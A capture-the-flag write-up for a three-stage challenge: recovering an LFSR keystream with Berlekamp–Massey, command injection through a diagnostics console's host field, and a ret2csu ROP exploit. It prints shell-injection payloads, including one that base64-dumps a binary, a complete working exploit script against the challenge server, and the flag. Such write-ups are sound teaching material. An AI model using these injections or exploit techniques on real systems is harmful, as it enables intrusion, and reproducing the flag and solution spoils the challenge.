> **Solved and written by** Hrishikesh (`hrishikesh`) · **Team** Cyfer Trace · **Submitted** Oct. 23, 2026, 2:16 p.m.
>
> **Official challenge:** Shift Register CRW3 · **Category:** Cryptography · **Difficulty:** Expert · **Points:** 700 · **Solves:** 77
>
> This writeup was contributed by the named teammate for the Cyfer Trace archive. It is not personal work by Ishant Choudhary. Light formatting and file links were added here; the technical content is the author's.

---

# Shift Register CRW3 — CTF7

## Flag

```text
ctf7{lfsr_berlekamp_massey_cmdi_ret2csu}
```

## Challenge overview

The challenge is a three-stage chain:

1. Recover the stream cipher keystream from known plaintext.
2. Use command injection in the diagnostics web console.
3. Exploit the downloaded maintenance binary with a ret2csu ROP chain.

The services were:

```text
Stage 1: nc 2.31.70.16 16230
Stage 2: http://2.31.70.16:16231/
Stage 3: nc 2.31.70.16 16232
```

## Stage 1 — LFSR stream cipher

The first service returned JSON containing:

- `known_plaintext`
- `header_len`
- `ciphertext`

The known plaintext was the complete frame header:

```text
SHIFT-REGISTER TELEMETRY LINK :: FRAME-HEADER v1 :: SYNC-PREAMBLE-0xACE1-DO-NOT-ALTER :: BEGIN-PAYLOAD >>
```

Since the cipher is an XOR stream cipher, the first part of the keystream is directly recoverable:

```python
keystream = ciphertext[:len(known_plaintext)] ^ known_plaintext
```

The keystream bits were fed into the Berlekamp–Massey algorithm. The resulting linear recurrence was then used to generate the rest of the keystream and decrypt the complete ciphertext.

The decrypted payload revealed the next service:

```json
{
  "stage": 2,
  "service": "internal host-diagnostics console",
  "transport": "http",
  "port": 16231,
  "method": "POST",
  "endpoint": "/diag",
  "field": "host",
  "note": "The diagnostics console runs a connectivity check by shelling out: `ping -c 1 <host>`. The host field is passed to the shell with no sanitisation. The Stage-3 maintenance binary lives on that host's filesystem under /opt/diagtools/."
}
```

The important detail is that the LFSR outputs bytes in the usual most-significant-bit-first representation when reconstructing the plaintext.

## Stage 2 — Command injection

The web application executes the supplied `host` value as part of a shell command:

```text
ping -c 1 <host>
```

The field is not sanitized, so shell metacharacters can append another command. For example:

```text
127.0.0.1; ls -la /opt/diagtools
```

This showed the maintenance binary:

```text
/opt/diagtools/shift_console
```

The binary was retrieved through command injection by base64-encoding it in the remote shell:

```text
127.0.0.1; echo __START__; base64 -w0 /opt/diagtools/shift_console; echo __END__
```

The output between `__START__` and `__END__` was base64-decoded locally and saved as `shift_console`.

## Stage 3 — Binary analysis

The binary was an x86-64 ELF and was not PIE, so its addresses were fixed. Relevant symbols were:

```text
vuln   = 0x401258
reveal = 0x401216
g_target = 0x404068
g_flag   = 0x4040c0
```

The vulnerable function allocates a 64-byte stack buffer and then reads up to `0x200` bytes into it:

```asm
sub rsp, 0x40
lea rax, [rbp - 0x40]
mov edx, 0x200
mov rsi, rax
mov edi, 0
call read
```

Therefore, the saved return address is reached after:

```text
0x40 bytes buffer + 0x8 bytes saved RBP = 72 bytes
```

The binary also contains the standard `__libc_csu_init` universal gadget:

```text
0x4013c0:
    mov rdx, r14
    mov rsi, r13
    mov edi, r12d
    call qword ptr [r15 + rbx*8]
    ...

0x4013da:
    pop rbx
    pop rbp
    pop r12
    pop r13
    pop r14
    pop r15
    ret
```

`g_target` contains a pointer to `reveal`, so the ROP chain can call it indirectly through the CSU gadget.

The desired call is:

```c
reveal(1, g_flag, 0x80);
```

The final payload uses:

- `r12 = 1`, which becomes `edi`
- `r13 = g_flag`, which becomes `rsi`
- `r14 = 0x80`, which becomes `rdx`
- `r15 = g_target`, used as the indirect call target

## Final exploit

The working payload was generated with:

```python
import socket
import struct

pack = lambda value: struct.pack("<Q", value)

payload = b"A" * 72

# ret; then pop rbx, rbp, r12, r13, r14, r15
payload += pack(0x40101a)
payload += pack(0x4013da)
payload += pack(0)          # rbx
payload += pack(1)          # rbp
payload += pack(1)          # r12 -> edi
payload += pack(0x4040c0)   # r13 -> rsi = g_flag
payload += pack(0x80)       # r14 -> rdx
payload += pack(0x404068)   # r15 -> [g_target] = reveal

# CSU call sequence
payload += pack(0x4013c0)

# CSU epilogue: add rsp, 8; pop six registers; ret
payload += pack(0)
payload += pack(0)
payload += pack(0)
payload += pack(0)
payload += pack(0)
payload += pack(0)
payload += pack(0)
payload += pack(0)

sock = socket.create_connection(("2.31.70.16", 16232))
sock.recv(4096)
sock.sendall(payload)
sock.shutdown(socket.SHUT_WR)

print(sock.recv(4096).decode(errors="replace"))
```

The maintenance console returned:

```text
ctf7{lfsr_berlekamp_massey_cmdi_ret2csu}
```
